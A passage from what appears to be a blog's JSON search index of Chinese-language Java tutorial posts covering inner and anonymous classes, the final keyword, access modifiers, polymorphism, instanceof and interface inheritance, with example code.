使用了匿名内部类，而且省略了对象名称，也是匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method1(); // 因为匿名对象无法调用第二次方法，所以需要再创建一个匿名内部类的匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method2(); &#125;&#125; 123456789package cn.itcast.day11.demo05;public interface MyInterface &#123; void method1(); // 抽象方法 void method2();&#125; 12345678910111213package cn.itcast.day11.demo05;public class MyInterfaceImpl implements MyInterface &#123; @Override public void method1() &#123; System.out.println(\"实现类覆盖重写了方法！111\"); &#125; @Override public void method2() &#123; System.out.println(\"实现类覆盖重写了方法！222\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java局部内部类的final问题","slug":"java00124局部内部类的final问题","date":"2020-03-13T13:12:18.000Z","updated":"2020-03-13T13:21:39.387Z","comments":true,"path":"2020/03/13/java00124局部内部类的final问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00124局部内部类的final问题/","excerpt":"","text":"java局部内部类的final问题 局部内部类，如果希望访问所在方法的局部变量，那么这个局部变量必须是【有效final的】。 备注： 从Java 8+开始，只要局部变量事实不变，那么final关键字可以省略。 原因： new出来的对象在堆内存当中。 局部变量是跟着方法走的，在栈内存当中。 方法运行结束之后，立刻出栈，局部变量就会立刻消失。 但是new出来的对象会在堆当中持续存在，直到垃圾回收消失。 12345678910111213141516package cn.itcast.day11.demo04;public class MyOuter &#123; public void methodOuter() &#123; int num = 10; // 所在方法的局部变量 class MyInner &#123; public void methodInner() &#123; System.out.println(num); &#125; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java局部内部类定义","slug":"java00123局部内部类定义","date":"2020-03-12T14:58:22.000Z","updated":"2020-03-12T15:01:34.066Z","comments":true,"path":"2020/03/12/java00123局部内部类定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00123局部内部类定义/","excerpt":"","text":"java局部内部类定义 如果一个类是定义在一个方法内部的，那么这就是一个局部内部类。 “局部”：只有当前所属的方法才能使用它，出了这个方法外面就不能用了。 定义格式： 1234567修饰符 class 外部类名称 &#123; 修饰符 返回值类型 外部类方法名称(参数列表) &#123; class 局部内部类名称 &#123; // ... &#125; &#125;&#125; 小节一下类的权限修饰符： public &gt; protected &gt; (default) &gt; private 定义一个类的时候，权限修饰符规则： 外部类：public / (default) 成员内部类：public / protected / (default) / private 局部内部类：什么都不能写 123456789101112131415161718package cn.itcast.day11.demo04;class Outer &#123; public void methodOuter() &#123; class Inner &#123; // 局部内部类 int num = 10; public void methodInner() &#123; System.out.println(num); // 10 &#125; &#125; Inner inner = new Inner(); inner.methodInner(); &#125;&#125; 12345678910package cn.itcast.day11.demo04;public class DemoMain &#123; public static void main(String[] args) &#123; Outer obj = new Outer(); obj.methodOuter(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java内部类的同名变量访问","slug":"java00122内部类的同名变量访问","date":"2020-03-12T09:44:02.000Z","updated":"2020-03-12T14:57:39.341Z","comments":true,"path":"2020/03/12/java00122内部类的同名变量访问/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00122内部类的同名变量访问/","excerpt":"","text":"java内部类的同名变量访问 格式是： 外部类名称.this.外部类成员变量名 声明内部类对象: 外部类名称.内部类名称 对象名 = new 外部类名称().new 内部类名称(); 123456789101112131415161718192021package cn.itcast.day11.demo03;// 如果出现了重名现象，那么格式是：外部类名称.this.外部类成员变量名public class Outer &#123; int num = 10; // 外部类的成员变量 public class Inner /*extends Object*/ &#123; int num = 20; // 内部类的成员变量 public void methodInner() &#123; int num = 30; // 内部类方法的局部变量 System.out.println(num); // 局部变量，就近原则 System.out.println(this.num); // 内部类的成员变量 System.out.println(Outer.this.num); // 外部类的成员变量 &#125; &#125;&#125; 1234567891011package cn.itcast.day11.demo03;public class Demo02InnerClass &#123; public static void main(String[] args) &#123; // 外部类名称.内部类名称 对象名 = new 外部类名称().new 内部类名称(); Outer.Inner obj = new Outer().new Inner(); obj.methodInner(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java成员内部类的使用","slug":"java00121成员内部类的使用","date":"2020-03-12T09:36:26.000Z","updated":"2020-03-12T09:42:58.148Z","comments":true,"path":"2020/03/12/java00121成员内部类的使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00121成员内部类的使用/","excerpt":"","text":"java成员内部类的使用 如何使用成员内部类？ 有两种方式： 间接方式： 在外部类的方法当中，使用内部类；然后main只是调用外部类的方法。 直接方式，公式： 类名称 对象名 = new 类名称(); 【外部类名称.内部类名称 对象名 = new 外部类名称().new 内部类名称();】 1234567891011121314151617package cn.itcast.day11.demo03;public class Demo01InnerClass &#123; public static void main(String[] args) &#123; Body body = new Body(); // 外部类的对象 // 通过外部类的对象，调用外部类的方法，里面间接在使用内部类Heart body.methodBody(); System.out.println(\"=====================\"); // 按照公式写： Body.Hearts heart = new Body().new Heart(); heart.beat(); &#125;&#125; 12345678910111213141516171819202122232425262728293031package cn.itcast.day11.demo03;public class Body &#123; // 外部类 public class Heart &#123; // 成员内部类 // 内部类的方法 public void beat() &#123; System.out.println(\"心脏跳动：蹦蹦蹦！\"); System.out.println(\"我叫：\" + name); // 正确写法！ &#125; &#125; // 外部类的成员变量 private String name; // 外部类的方法 public void methodBody() &#123; System.out.println(\"外部类的方法\"); new Heart().beat(); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java成员内部类的定义","slug":"java00120成员内部类的定义","date":"2020-03-12T09:33:33.000Z","updated":"2020-03-12T09:35:48.343Z","comments":true,"path":"2020/03/12/java00120成员内部类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00120成员内部类的定义/","excerpt":"","text":"java成员内部类的定义 成员内部类的定义格式： 12345678修饰符 class 外部类名称 &#123; 修饰符 class 内部类名称 &#123; // ... &#125; // ...&#125; 注意： 内用外，随意访问；外用内，需要内部类对象。 12345678910111213141516package cn.itcast.day11.demo03;public class Demo01InnerClass &#123; public static void main(String[] args) &#123; Body body = new Body(); // 外部类的对象 // 通过外部类的对象，调用外部类的方法，里面间接在使用内部类Heart body.methodBody(); System.out.println(\"=====================\"); // 按照公式写： Body.Heart heart = new Body().new Heart(); heart.beat(); &#125;&#125; 12345678910111213141516171819202122232425262728293031package cn.itcast.day11.demo03;public class Body &#123; // 外部类 public class Heart &#123; // 成员内部类 // 内部类的方法 public void beat() &#123; System.out.println(\"心脏跳动：蹦蹦蹦！\"); System.out.println(\"我叫：\" + name); // 正确写法！ &#125; &#125; // 外部类的成员变量 private String name; // 外部类的方法 public void methodBody() &#123; System.out.println(\"外部类的方法\"); new Heart().beat(); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java内部类的概念与分类","slug":"java00119内部类的概念与分类","date":"2020-03-12T09:30:07.000Z","updated":"2020-03-12T09:32:54.484Z","comments":true,"path":"2020/03/12/java00119内部类的概念与分类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00119内部类的概念与分类/","excerpt":"","text":"java内部类的概念与分类 如果一个事物的内部包含另一个事物，那么这就是一个类内部包含另一个类。 例如：身体和心脏的关系。又如：汽车和发动机的关系。 分类： 成员内部类 局部内部类（包含匿名内部类） 1234567package cn.itcast.day11.demo03;public class Demo01InnerClass &#123;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java四种权限修饰符","slug":"java00118四种权限修饰符","date":"2020-03-12T07:59:46.000Z","updated":"2020-03-12T09:29:42.197Z","comments":true,"path":"2020/03/12/java00118四种权限修饰符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00118四种权限修饰符/","excerpt":"","text":"java四种权限修饰符 Java中有四种权限修饰符： public &gt; protected &gt; (default) &gt; private 同一个类（我自己） YES YES YES YES 同一个包（我邻居） YES YES YES NO 不同包子类（我儿子） YES YES NO NO 不同包非子类（陌生人） YES NO NO NO 注意事项： (default)并不是关键字“default”，而是根本不写。 sub包中的类 1234567891011package cn.itcast.day11.demo02.sub;import cn.itcast.day11.demo02.MyClass;public class Stranger &#123; public void methodStrange() &#123; System.out.println(new MyClass().num); &#125;&#125; 123456789101112package cn.itcast.day11.demo02.sub;import cn.itcast.day11.demo02.MyClass;public class MySon extends MyClass &#123; public void methodSon() &#123;// System.out.println(super.num); &#125;&#125; demo02包中的类 1234567891011package cn.itcast.day11.demo02;public class MyClass &#123; public int num = 10; public void method() &#123; System.out.println(num); &#125;&#125; 12345package cn.itcast.day11.demo02;public class Demo01Main &#123;&#125; 123456789package cn.itcast.day11.demo02;public class MyAnother &#123; public void anotherMethod() &#123;// System.out.println(new MyClass().num); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰成员变量","slug":"java00117final关键字用于修饰成员变量","date":"2020-03-12T07:54:37.000Z","updated":"2020-03-12T07:57:43.442Z","comments":true,"path":"2020/03/12/java00117final关键字用于修饰成员变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00117final关键字用于修饰成员变量/","excerpt":"","text":"java final关键字用于修饰成员变量 对于成员变量来说，如果使用final关键字修饰，那么这个变量也照样是不可变。 由于成员变量具有默认值，所以用了final之后必须手动赋值，不会再给默认值了。 对于final的成员变量，要么使用直接赋值，要么通过构造方法赋值。二者选其一。 必须保证类当中所有重载的构造方法，都最终会对final的成员变量进行赋值。 12345678910111213141516171819202122package cn.itcast.day11.demo01;public class Person &#123; private final String name/* = \"鹿晗\"*/; public Person() &#123; name = \"关晓彤\"; &#125; public Person(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125;// public void setName(String name) &#123;// this.name = name;// &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰局部变量","slug":"java00116final关键字用于修饰局部变量","date":"2020-03-12T07:50:56.000Z","updated":"2020-03-12T07:54:01.844Z","comments":true,"path":"2020/03/12/java00116final关键字用于修饰局部变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00116final关键字用于修饰局部变量/","excerpt":"","text":"java final关键字用于修饰局部变量 对于基本类型来说，不可变说的是变量当中的数据不可改变 对于引用类型来说，不可变说的是变量当中的地址值不可改变 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package cn.itcast.day11.demo01;/*final关键字代表最终、不可改变的。常见四种用法：1. 可以用来修饰一个类2. 可以用来修饰一个方法3. 还可以用来修饰一个局部变量4. 还可以用来修饰一个成员变量 */public class Demo01Final &#123; public static void main(String[] args) &#123; int num1 = 10; System.out.println(num1); // 10 num1 = 20; System.out.println(num1); // 20 // 一旦使用final用来修饰局部变量，那么这个变量就不能进行更改。 // “一次赋值，终生不变” final int num2 = 200; System.out.println(num2); // 200// num2 = 250; // 错误写法！不能改变！// num2 = 200; // 错误写法！ // 正确写法！只要保证有唯一一次赋值即可 final int num3; num3 = 30; // 对于基本类型来说，不可变说的是变量当中的数据不可改变 // 对于引用类型来说，不可变说的是变量当中的地址值不可改变 Student stu1 = new Student(\"赵丽颖\"); System.out.println(stu1); System.out.println(stu1.getName()); // 赵丽颖 stu1 = new Student(\"霍建华\"); System.out.println(stu1); System.out.println(stu1.getName()); // 霍建华 System.out.println(\"===============\"); final Student stu2 = new Student(\"高圆圆\"); // 错误写法！final的引用类型变量，其中的地址不可改变// stu2 = new Student(\"赵又廷\"); System.out.println(stu2.getName()); // 高圆圆 stu2.setName(\"高圆圆圆圆圆圆\"); System.out.println(stu2.getName()); // 高圆圆圆圆圆圆 &#125;&#125; 123456789101112131415161718192021package cn.itcast.day11.demo01;public class Student &#123; private String name; public Student() &#123; &#125; public Student(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰成员方法","slug":"java00115final关键字用于修饰成员方法","date":"2020-03-12T07:38:55.000Z","updated":"2020-03-12T07:42:07.282Z","comments":true,"path":"2020/03/12/java00115final关键字用于修饰成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00115final关键字用于修饰成员方法/","excerpt":"","text":"java final关键字用于修饰成员方法 当final关键字用来修饰一个方法的时候，这个方法就是最终方法，也就是不能被覆盖重写。 格式： 123修饰符 final 返回值类型 方法名称(参数列表) &#123; // 方法体&#125; 注意事项： 对于类、方法来说，abstract关键字和final关键字不能同时使用，因为矛盾。 123456789101112package cn.itcast.day11.demo01;public abstract class Fu &#123; public final void method() &#123; System.out.println(\"父类方法执行！\"); &#125; public abstract /*final*/ void methodAbs() ;&#125; 1234567891011121314package cn.itcast.day11.demo01;public class Zi extends Fu &#123; @Override public void methodAbs() &#123; &#125; // 错误写法！不能覆盖重写父类当中final的方法// @Override// public void method() &#123;// System.out.println(\"子类覆盖重写父类的方法！\");// &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字用于修饰类","slug":"java00114final关键字用于修饰类","date":"2020-03-12T07:31:37.000Z","updated":"2020-03-12T07:35:31.308Z","comments":true,"path":"2020/03/12/java00114final关键字用于修饰类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00114final关键字用于修饰类/","excerpt":"","text":"java final关键字用于修饰类 当final关键字用来修饰一个类的时候， 格式： 123public final class 类名称 &#123; // ...&#125; 含义： 当前这个类不能有任何的子类。（太监类） 注意： 一个类如果是final的，那么其中所有的成员方法都无法进行覆盖重写（因为没儿子。） 123456789package cn.itcast.day11.demo01;public final class MyClass /*extends Object*/ &#123; public void method() &#123; System.out.println(\"方法执行！\"); &#125;&#125; 12345package cn.itcast.day11.demo01;// 不能使用一个final类来作为父类public class MySubClass /*extends MyClass*/ &#123;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java final关键字与四种用法","slug":"java00113final关键字与四种用法","date":"2020-03-12T07:26:50.000Z","updated":"2020-03-12T07:31:02.653Z","comments":true,"path":"2020/03/12/java00113final关键字与四种用法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/12/java00113final关键字与四种用法/","excerpt":"","text":"java final关键字与四种用法 final关键字代表最终、不可改变的。 常见四种用法： 可以用来修饰一个类 可以用来修饰一个方法 还可以用来修饰一个局部变量 还可以用来修饰一个成员变量","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java关键字读法","slug":"java00112关键字读法","date":"2020-03-11T14:51:47.000Z","updated":"2020-03-11T14:59:57.864Z","comments":true,"path":"2020/03/11/java00112关键字读法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00112关键字读法/","excerpt":"","text":"java关键字读法","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口多态","slug":"java00111接口多态","date":"2020-03-11T11:36:49.000Z","updated":"2020-03-11T11:46:56.254Z","comments":true,"path":"2020/03/11/java00111接口多态/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00111接口多态/","excerpt":"","text":"java接口多态 接口多态和类多态是一样的用法 定义格式: 123456789public interface 父接口&#123; //内容&#125;public class 类名A implements 父接口 &#123; //内容&#125;public class 类名B implements 父接口 &#123; //内容&#125; 使用格式: 父接口类型 接口对象名 = new 类名(); 1234567891011package xiaochenyan.top.demo003;public class DemoMain&#123; public static void main(String[] args) &#123; Computer cm = new Computer(); cm.open(); cm.local(new usbMouse()); cm.local(new usbKeyboard()); cm.close(); &#125;&#125; 123456package xiaochenyan.top.demo003;public interface USB&#123; public abstract void open(); public abstract void close();&#125; 12345678910111213141516package xiaochenyan.top.demo003;public class usbKeyboard implements USB&#123; @Override public void open() &#123; System.out.println(\"打开键盘\"); &#125; @Override public void close() &#123; System.out.println(\"关闭键盘\"); &#125; public void qiaoJiJianPan()&#123; System.out.println(\"敲击键盘\"); &#125;&#125; 12345678910111213141516package xiaochenyan.top.demo003;public class usbMouse implements USB&#123; @Override public void open() &#123; System.out.println(\"打开鼠标\"); &#125; @Override public void close() &#123; System.out.println(\"关闭鼠标\"); &#125; public void shuBiaoDianJi()&#123; System.out.println(\"鼠标点击\"); &#125;&#125; 123456789101112131415161718192021222324252627package xiaochenyan.top.demo003;public class Computer&#123; public void open()&#123; System.out.println(\"打开电脑\"); &#125; public void close()&#123; System.out.println(\"关闭电脑\"); &#125; //使用接口进行多态处理 public void local(USB obj) &#123; obj.open(); if(obj instanceof usbMouse)&#123; ((usbMouse) obj).shuBiaoDianJi(); &#125;else if(obj instanceof usbKeyboard)&#123; ((usbKeyboard) obj).qiaoJiJianPan(); &#125; obj.close(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java用instanceof关键字进行类型判断","slug":"java00109用instanceof关键字进行类型判断","date":"2020-03-11T09:15:30.000Z","updated":"2020-03-11T09:21:06.904Z","comments":true,"path":"2020/03/11/java00109用instanceof关键字进行类型判断/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00109用instanceof关键字进行类型判断/","excerpt":"","text":"java用instanceof关键字进行类型判断 如何才能知道一个父类引用的对象，本来是什么子类？ 格式： 对象 instanceof 类名称 这将会得到一个boolean值结果，也就是判断前面的对象能不能当做后面类型的实例。 1234567package cn.itcast.day10.demo06;public abstract class Animal &#123; public abstract void eat();&#125; 12345678910111213package cn.itcast.day10.demo06;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125; // 子类特有方法 public void catchMouse() &#123; System.out.println(\"猫抓老鼠\"); &#125;&#125; 123456789101112package cn.itcast.day10.demo06;public class Dog extends Animal &#123; @Override public void eat() &#123; System.out.println(\"狗吃SHIT\"); &#125; public void watchHouse() &#123; System.out.println(\"狗看家\"); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435package cn.itcast.day10.demo06;public class Demo02Instanceof &#123; public static void main(String[] args) &#123; Animal animal = new Dog(); // 本来是一只狗 animal.eat(); // 狗吃SHIT // 如果希望掉用子类特有方法，需要向下转型 // 判断一下父类引用animal本来是不是Dog if (animal instanceof Dog) &#123; Dog dog = (Dog) animal; dog.watchHouse(); &#125; // 判断一下animal本来是不是Cat if (animal instanceof Cat) &#123; Cat cat = (Cat) animal; cat.catchMouse(); &#125; giveMeAPet(new Dog()); &#125; public static void giveMeAPet(Animal animal) &#123; if (animal instanceof Dog) &#123; Dog dog = (Dog) animal; dog.watchHouse(); &#125; if (animal instanceof Cat) &#123; Cat cat = (Cat) animal; cat.catchMouse(); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java对象的向下转型","slug":"java00108对象的向下转型","date":"2020-03-11T08:57:49.000Z","updated":"2020-03-11T09:19:41.252Z","comments":true,"path":"2020/03/11/java00108对象的向下转型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00108对象的向下转型/","excerpt":"","text":"java对象的向下转型 向上转型一定是安全的，没有问题的，正确的。但是也有一个弊端： 对象一旦向上转型为父类，那么就无法调用子类原本特有的内容。 解决方案：用对象的向下转型【还原】。 格式 : 子类类型 子类对象名 = (子类类型)父类对象 1234567package cn.itcast.day10.demo06;public abstract class Animal &#123; public abstract void eat();&#125; 12345678910111213package cn.itcast.day10.demo06;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125; // 子类特有方法 public void catchMouse() &#123; System.out.println(\"猫抓老鼠\"); &#125;&#125; 123456789101112package cn.itcast.day10.demo06;public class Dog extends Animal &#123; @Override public void eat() &#123; System.out.println(\"狗吃SHIT\"); &#125; public void watchHouse() &#123; System.out.println(\"狗看家\"); &#125;&#125; 123456789101112131415161718192021222324package cn.itcast.day10.demo06;public class Demo01Main &#123; public static void main(String[] args) &#123; // 对象的向上转型，就是：父类引用指向之类对象。 Animal animal = new Cat(); // 本来创建的时候是一只猫 animal.eat(); // 猫吃鱼// animal.catchMouse(); // 错误写法！ // 向下转型，进行“还原”动作 Cat cat = (Cat) animal; cat.catchMouse(); // 猫抓老鼠 // 下面是错误的向下转型 // 本来new的时候是一只猫，现在非要当做狗 // 错误写法！编译不会报错，但是运行会出现异常： // java.lang.ClassCastException，类转换异常 Dog dog = (Dog) animal; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java对象的向上转型","slug":"java00107对象的向上转型","date":"2020-03-11T08:44:08.000Z","updated":"2020-06-10T11:26:37.164Z","comments":true,"path":"2020/03/11/java00107对象的向上转型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00107对象的向上转型/","excerpt":"","text":"java对象的向上转型 1234567package cn.itcast.day10.demo06;public abstract class Animal &#123; public abstract void eat();&#125; 12345678910111213package cn.itcast.day10.demo06;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125; // 子类特有方法 public void catchMouse() &#123; System.out.println(\"猫抓老鼠\"); &#125;&#125; 1234567891011121314package cn.itcast.day10.demo06; */public class Demo01Main &#123; public static void main(String[] args) &#123; // 对象的向上转型，就是：父类引用指向子类对象。 Animal animal = new Cat(); animal.eat(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java使用多态的好处","slug":"java00106使用多态的好处","date":"2020-03-11T08:29:46.000Z","updated":"2020-03-11T08:43:15.011Z","comments":true,"path":"2020/03/11/java00106使用多态的好处/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00106使用多态的好处/","excerpt":"","text":"java使用多态的好处","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态中成员方法的使用特点","slug":"java00105多态中成员方法的使用特点","date":"2020-03-11T08:29:41.000Z","updated":"2020-03-11T11:33:06.491Z","comments":true,"path":"2020/03/11/java00105多态中成员方法的使用特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00105多态中成员方法的使用特点/","excerpt":"","text":"java多态中成员方法的使用特点 在多态的代码当中，成员方法的访问规则是： ​ 看new的是谁，就优先用谁，没有则向上找。 口诀： 编译看左边，运行看右边。 对比一下： 成员变量： 编译看左边，运行还看左边。 成员方法： 编译看左边，运行看右边。 12345678910111213141516package cn.itcast.day10.demo05;public class Demo02MultiMethod &#123; public static void main(String[] args) &#123; Fu obj = new Zi(); // 多态 obj.method(); // 父子都有，优先用子 obj.methodFu(); // 子类没有，父类有，向上找到父类 // 编译看左边，左边是Fu，Fu当中没有methodZi方法，所以编译报错。// obj.methodZi(); // 错误写法！ &#125;&#125; 12345678910111213141516171819package cn.itcast.day10.demo05;public class Fu /*extends Object*/ &#123; int num = 10; public void showNum() &#123; System.out.println(num); &#125; public void method() &#123; System.out.println(\"父类方法\"); &#125; public void methodFu() &#123; System.out.println(\"父类特有方法\"); &#125;&#125; 12345678910111213141516171819202122package cn.itcast.day10.demo05;public class Zi extends Fu &#123; int num = 20; int age = 16; @Override public void showNum() &#123; System.out.println(num); &#125; @Override public void method() &#123; System.out.println(\"子类方法\"); &#125; public void methodZi() &#123; System.out.println(\"子类特有方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态中成员变量的使用特点","slug":"java00104多态中成员变量的使用特点","date":"2020-03-11T08:14:50.000Z","updated":"2020-03-11T08:22:24.544Z","comments":true,"path":"2020/03/11/java00104多态中成员变量的使用特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00104多态中成员变量的使用特点/","excerpt":"","text":"java多态中成员变量的使用特点 访问成员变量的两种方式： 直接通过对象名称访问成员变量：看等号左边是谁，优先用谁，没有则向上找。 间接通过成员方法访问成员变量：看该方法属于谁，优先用谁，没有则向上找。 123456789101112131415161718package cn.itcast.day10.demo05;public class Demo01MultiField &#123; public static void main(String[] args) &#123; // 使用多态的写法，父类引用指向子类对象 Fu obj = new Zi(); System.out.println(obj.num); // 父：10// System.out.println(obj.age); // 错误写法！ System.out.println(\"=============\"); // 子类没有覆盖重写，就是父：10 // 子类如果覆盖重写，就是子：20 obj.showNum(); &#125;&#125; 12345678910111213141516171819package cn.itcast.day10.demo05;public class Fu /*extends Object*/ &#123; int num = 10; public void showNum() &#123; System.out.println(num); &#125; public void method() &#123; System.out.println(\"父类方法\"); &#125; public void methodFu() &#123; System.out.println(\"父类特有方法\"); &#125;&#125; 12345678910111213141516171819202122package cn.itcast.day10.demo05;public class Zi extends Fu &#123; int num = 20; int age = 16; @Override public void showNum() &#123; System.out.println(num); &#125; @Override public void method() &#123; System.out.println(\"子类方法\"); &#125; public void methodZi() &#123; System.out.println(\"子类特有方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态的格式与使用","slug":"java00103多态的格式与使用","date":"2020-03-11T08:09:47.000Z","updated":"2020-03-11T08:14:13.229Z","comments":true,"path":"2020/03/11/java00103多态的格式与使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00103多态的格式与使用/","excerpt":"","text":"java多态的格式与使用 代码当中体现多态性，其实就是一句话：父类引用指向子类对象。 格式： 父类名称 对象名 = new 子类名称(); 或者： 接口名称 对象名 = new 实现类名称(); 12345678910111213package cn.itcast.day10.demo04;public class Demo01Multi &#123; public static void main(String[] args) &#123; // 使用多态的写法 // 左侧父类的引用，指向了右侧子类的对象 Fu obj = new Zi(); obj.method(); obj.methodFu(); &#125;&#125; 12345678910111213package cn.itcast.day10.demo04;public class Fu &#123; public void method() &#123; System.out.println(\"父类方法\"); &#125; public void methodFu() &#123; System.out.println(\"父类特有方法\"); &#125;&#125; 123456789package cn.itcast.day10.demo04;public class Zi extends Fu &#123; @Override public void method() &#123; System.out.println(\"子类方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java多态的概述","slug":"java00102多态的概述","date":"2020-03-11T08:06:25.000Z","updated":"2020-03-11T08:09:14.206Z","comments":true,"path":"2020/03/11/java00102多态的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00102多态的概述/","excerpt":"","text":"java多态的概述","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口之间的多继承","slug":"java00110接口之间的多继承","date":"2020-03-11T07:57:13.000Z","updated":"2020-03-11T08:05:01.673Z","comments":true,"path":"2020/03/11/java00110接口之间的多继承/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/11/java00110接口之间的多继承/","excerpt":"","text":"java接口之间的多继承 类与类之间是单继承的。直接父类只有一个。 类与接口之间是多实现的。一个类可以实现多个接口。 接口与接口之间是多继承的。 注意事项： 多个父接口当中的抽象方法如果重复，没关系。 多个父接口当中的默认方法如果重复，那么子接口必须进行默认方法的覆盖重写，【而且带着default关键字】。 12345package cn.itcast.day10.demo03;public class Demo01Relations &#123;&#125; 12345678910111213package cn.itcast.day10.demo03;public interface MyInterfaceA &#123; public abstract void methodA(); public abstract void methodCommon(); public default void methodDefault() &#123; System.out.println(\"AAA\"); &#125;&#125; 12345678910111213package cn.itcast.day10.demo03;public interface MyInterfaceB &#123; public abstract void methodB(); public abstract void methodCommon(); public default void methodDefault() &#123; System.out.println(\"BBB\"); &#125;&#125; 123456789101112131415161718package cn.itcast.day10.demo03;/*这个子接口当中有几个方法？答：4个。methodA 来源于接口AmethodB 来源于接口BmethodCommon 同时来源于接口A和Bmethod 来源于我自己 */public interface MyInterface extends MyInterfaceA, MyInterfaceB &#123; public abstract void method(); @Override public default void methodDefault() &#123; &#125;&#125; 1234567891011121314151617181920212223package cn.itcast.day10.demo03;public class MyInterfaceImpl implements MyInterface &#123; @Override public void method() &#123; &#125; @Override public void methodA() &#123; &#125; @Override public void methodB() &#123; &#125; @Override public void methodCommon() &#123; 